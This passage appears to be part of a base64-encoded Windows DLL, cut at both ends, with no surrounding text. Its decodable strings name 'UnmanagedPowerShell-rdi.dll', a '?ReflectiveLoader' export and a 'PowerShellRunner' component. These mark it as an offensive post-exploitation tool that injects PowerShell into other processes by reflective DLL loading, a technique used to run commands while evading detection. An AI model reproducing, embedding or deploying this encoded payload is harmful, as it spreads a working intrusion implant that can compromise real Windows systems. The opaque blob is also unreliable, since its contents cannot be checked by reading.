BjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBfVAAcgBvAG0AcAB0AEYAbwByAEMAcgBlAGQAZQBuAHQAaQBhAGwAMQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF9UAByAG8AbQBwAHQARgBvAHIAQwByAGUAZABlAG4AdABpAGEAbAAyACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgWVSAGUAYQBkAEwAaQBuAGUAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBgVIAZQBhAGQATABpAG4AZQBBAHMAUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAFJRgBsAHUAcwBoAEkAbgBwAHUAdABCAHUAZgBmAGUAcgAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AAEtHAGUAdABCAHUAZgBmAGUAcgBDAG8AbgB0AGUAbgB0AHMAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAABBSwBlAHkAQQB2AGEAaQBsAGEAYgBsAGUAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAACBY1IAZQBhAGQASwBlAHkAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAFPUwBjAHIAbwBsAGwAQgB1AGYAZgBlAHIAQwBvAG4AdABlAG4AdABzACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQAAEtTAGUAdABCAHUAZgBmAGUAcgBDAG8AbgB0AGUAbgB0AHMAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAABJUwBlAHQAQgB1AGYAZgBlAHIAQwBvAG4AdABlAG4AdABzACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQAAAEAAADMOjL4sfp/RKohafTu510+AAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIKBwQSDBJBEkUSSQQAABJBBiABARGArQYgAQESgLEIAAISRRJNEkEEIAASSQUgABKAuQcVEnUBEoC9BSABEwAICSACARGAwRGAwQggABUSdQEScQQgABJZBSACAQgIBQAAEoDJBCAAEl0EAAARUQUgARJhDgUAAg4ODgMgAA4IBwIRgJURgJkIt3pcVhk04IkIMb84Vq02TjUDBhFRAwYSEAMGEmEDBhIUBAYRgJUEBhGAmQIGCAMGEWUCBg4EAAEODgQgABFRBCAAElUIIAMBEWURZQ4GIAIBChJpESADFRJtAg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oAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAr8LiVwAAAAANAAAAbAMAANzBAQDctQEAAAAAAK/C4lcAAAAADgAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATgARAAwQEQCQAAAFAhARAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAADOgBEJi/ARAAAAAAAAAAAAEAAACovwEQsL8BEAAAAAAM6AEQAAAAAAAAAAD/////AAAAAEAAAACYvwEQAAAAAAAAAAAAAAAA8OcBEOC/ARAAAAAAAAAAAAIAAADwvwEQ/L8BELC/ARAAAAAA8OcBEAEAAAAAAAAA/////wAAAABAAAAA4L8BEAAAAAAAAAAAAAAAACjoARAswAEQAAAAAAAAAAADAAAAPMABEEzAARD8vwEQsL8BEAAAAAAo6AEQAgAAAAAAAAD/////AAAAAEAAAAAswAEQAAAAAAAAAAAAAAAAUO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AAABAAAACgLgAQ/v///wAAAADQ////AAAAAP7///8AAAAAQTsAEAAAAAAGOwAQEDsAEP7///8AAAAAqP///wAAAAD+////AAAAAIExABAAAAAA1jAAEOAwABD+////AAAAANj///8AAAAA/v///ww5ABAQOQAQAAAAAP7///8AAAAA2P///wAAAAD+////3y8AEOgvABBAAAAAAAAAAAAAAAAoMgAQ/////wAAAAD/////AAAAAAAAAAAAAAAAAQAAAAEAAAAUyAEQIgWTGQIAAAAkyAEQAQAAADTIARAAAAAAAAAAAAAAAAABAAAAAAAAAP7///8AAAAA0P///wAAAAD+////NzoAEDs6ABAAAAAAqCQAEAAAAACcyAEQAgAAAKjIARC8xgEQAAAAAIToARAAAAAA/////wAAAAAMAAAAEzAAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAClVgAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAADlqABAAAAAA5P///wAAAADU////AAAAAP7///8AAAAAo20AEAAAAACLbQAQm20AEP7///8AAAAA1P///wAAAAD+////AAAAAFxxABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAArXEAEAAAAADk////AAAAANT///8AAAAA/v///4V2ABCJdgAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAKKHABAAAAAA/v///wAAAADE////AAAAAP7///8AAAAALYkAEAAAAAAAAAAAAIkAEP7///8AAAAA1P///wAAAAD+////AAAAAC2LABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAA5MAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAAAPkgAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAHCSABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAu5IAEAAAAAD+////AAAAANj///8AAAAA/v///wAAAAAlpAAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAFSqABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAABaUAEAAAAADk////AAAAALT///8AAAAA/v///wAAAAAIsgAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAFuvABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAA7YAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAACZtgAQAAAAAP7///8AAAAAzP///wAAAAD+////AAAAAIu9ABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAAAcEAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAA8yAAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAM7qABAAAAAA/v///wAAAADE////AAAAAP7///8AAAAAKu0AEAAAAAD+////AAAAANj///8AAAAA/v///4kRARCcEQEQAAAAAAAAAAAAAAAAAAAAAK7C4lcAAAAAXMwBAAEAAAACAAAAAgAAAEjMAQBQzAEAWMwBADMVAACFFAAAeMwBAJTMAQAAAAEAVW5tYW5hZ2VkUG93ZXJTaGVsbC1yZGkuZGxsAD9SZWZsZWN0aXZlTG9hZGVyQEBZR0tQQVhAWgBWb2lkRnVuYwAAAAAMzQEAAAAAAAAAAAC8zgEACCABAEjOAQAAAAAAAAAAAO7OAQBEIQEAHM4BAAAAAAAAAAAA+M4BABghAQAEzQEAAAAAAAAAAACG0wEAACABAAAAAAAAAAAAAAAAAAAAAAAAAAAActMBAAAAAACEzgEAlM4BAKTOAQB2zgEAZM4BAFTOAQBi0wEAVNMBAETTAQAw0wEAItMBABTTAQAI0wEA+NIBAAbPAQAizwEAQM8BAFTPAQBozwEAhM8BAJ7PAQC0zwEAys8BAOTPAQD6zwEADtABACDQAQA00AEARNABAFrQAQBw0AEAfNABAIzQAQCi0AEAtNABAMzQAQDY0AEA6NABABDRAQAc0QEAKtEBADjRAQBC0QEAVNEBAGzRAQCE0QEAnNEBAKrRAQDA0QEAzNEBANjRAQDo0QEA+NEBAAbSAQAQ0gEAItIBAC7SAQA60gEAVNIBAG7SAQCA0gEAktIBAKTSAQC20gEAytIBANbSAQDm0gEAAAAAABYAAIAVAACADwAAgBAAAIAaAACAmwEAgAkAAIAIAACABgAAgAIAAIAAAAAA3M4BAMrOAQAAAAAAPwNMb2FkTGlicmFyeVcAAEUCR2V0UHJvY0FkZHJlc3MAAGIBRnJlZUxpYnJhcnkAcwJHZXRTeXN0ZW1JbmZvAFgEU2V0RXJyb3JNb2RlAADrAkludGVybG9ja2VkRGVjcmVtZW50AABLRVJORUwzMi5kbGwAAD8AQ29Jbml0aWFsaXplRXgAAGwAQ29VbmluaXRpYWxpemUAAG9sZTMyLmRsbABPTEVBVVQzMi5kbGwAANMEVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAAClBFNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgDAAUdldEN1cnJlbnRQcm9jZXNzAMAEVGVybWluYXRlUHJvY2VzcwAABANJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AKcDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAwQFHZXRDdXJyZW50UHJvY2Vzc0lkAMUBR2V0Q3VycmVudFRocmVhZElkAAB5AkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAOcCSW5pdGlhbGl6ZVNMaXN0SGVhZAAAA0lzRGVidWdnZXJQcmVzZW50AGMCR2V0U3RhcnR1cEluZm9XABgCR2V0TW9kdWxlSGFuZGxlVwAAAgJHZXRMYXN0RXJyb3IAAGcDTXVsdGlCeXRlVG9XaWRlQ2hhcgARBVdpZGVDaGFyVG9NdWx0aUJ5dGUASANMb2NhbEZyZWUA6gBFbmNvZGVQb2ludGVyABQCR2V0TW9kdWxlRmlsZU5hbWVXAACxA1JhaXNlRXhjZXB0aW9uAADuAkludGVybG9ja2VkRmx1c2hTTGlzdAAYBFJ0bFVud2luZABzBFNldExhc3RFcnJvcgAA4wJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AMUEVGxzQWxsb2MAAMcEVGxzR2V0VmFsdWUAyARUbHNTZXRWYWx1ZQDGBFRsc0ZyZWUAPgNMb2FkTGlicmFyeUV4VwAA7gBFbnRlckNyaXRpY2FsU2VjdGlvbgAAOQNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAA0QBEZWxldGVDcml0aWNhbFNlY3Rpb24AGQFFeGl0UHJvY2VzcwAXAkdldE1vZHVsZUhhbmRsZUV4VwAAzwJIZWFwRnJlZQAAywJIZWFwQWxsb2MALQNMQ01hcFN0cmluZ1cAAGQCR2V0U3RkSGFuZGxlAADzAUdldEZpbGVUeXBlAGgBR2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